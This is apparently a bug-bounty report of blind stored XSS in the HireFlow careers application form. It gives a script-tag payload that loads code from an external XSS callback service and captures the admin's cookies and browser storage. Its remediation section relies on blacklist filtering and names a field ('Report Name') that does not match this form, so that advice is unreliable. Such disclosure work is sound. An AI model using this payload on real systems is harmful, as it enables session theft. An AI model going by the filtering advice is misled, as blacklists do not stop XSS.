## Title
Blind XSS - HireFlow Careers

## Description
**Affected URL:** https://hireflow.pwnedbox.site/

HireFlow's job application form appears vulnerable to Blind Stored Cross-Site Scripting (XSS). The application accepts HTML/JavaScript payloads in multiple applicant-controlled fields, including First Name, Last Name, Phone, Current Location, Experience, Notice Period, and Cover Letter. The submitted application is stored and later viewed in the HireFlow admin dashboard. The external XSS report callback received a request from the admin dashboard page, indicating that the injected payload executed in an administrative context.

## Steps to Reproduce

1. Open the following application URL in a browser: https://hireflow.pwnedbox.site/apply.php?job=1
2. Enter the following payload into the applicant fields: `"><script src=https://xss.report/c/priyanshxop></script>`
3. Submit the application.
4. Observe the application confirmation page showing that the application was received.
5. Open the HireFlow admin dashboard and review the submitted application.
6. Check the XSS report callback dashboard for the incoming request.
7. Observe a callback associated with: https://hireflow.pwnedbox.site/admin/index.php
8. Review the captured browser information, including the reported cookie, session storage, local storage, and DOM indicators.

## POC (Proof of Concept)

Screenshot 1: Application form with the payload entered into multiple applicant-controlled fields.

<img width="1915" height="965" alt="image" src="https://github.com/user-attachments/assets/83369d44-ffb3-4571-a8e6-80b7f92edb13" />

Screenshot 2: Remaining application fields containing the payload and the Submit Application button.

<img width="1912" height="950" alt="image" src="https://github.com/user-attachments/assets/5ea3b9f9-1dc3-4b5d-a340-0f6a087f4fe4" />

Screenshot 3: Application received confirmation page.

<img width="1918" height="952" alt="image" src="https://github.com/user-attachments/assets/dd28df28-fd59-4dda-b769-d823119ae7e9" />

Screenshot 4: HireFlow admin login page.

<img width="1918" height="960" alt="image" src="https://github.com/user-attachments/assets/be92dab0-f3a3-4a18-97c3-9a86d0aee01f" />

Screenshot 5: Admin dashboard displaying the submitted application.

<img width="1912" height="956" alt="image" src="https://github.com/user-attachments/assets/695c2929-8fc3-4460-9912-a23140d4739d" />

Screenshot 6: XSS report dashboard showing callbacks from the admin dashboard URL.

<img width="1918" height="968" alt="image" src="https://github.com/user-attachments/assets/3f569f7b-4d9d-41e5-8dcd-621b85002eb3" />

Screenshot 7: Captured DOM and browser storage information in the XSS report.

<img width="1918" height="958" alt="image" src="https://github.com/user-attachments/assets/e7fb0ad3-396e-416f-b1a6-239191f2ae8a" />


## Impact
- An attacker may execute JavaScript in an administrator's authenticated browser session.
- Sensitive information accessible to the administrator's page, including session-related or browser storage data, may be exposed if accessible to the injected script.
- The attacker may perform unauthorized actions through the administrator's session, depending on the application's permissions and protections.


## Remediation
- Filter out HTML tags like: `<script>`, `<img>`, `<svg>` from the Report Name field before saving anything to the database
- Filter out JavaScript methods like: `alert()`, `confirm()`, `prompt()` so even if a tag slips through the method won't execute
- If you're using PHP then use `htmlspecialchars()` function before rendering any user input back to the page
- Use Cloudflare as they have so many WAF rules that almost all XSS payloads will be blocked automatically before even reaching the server
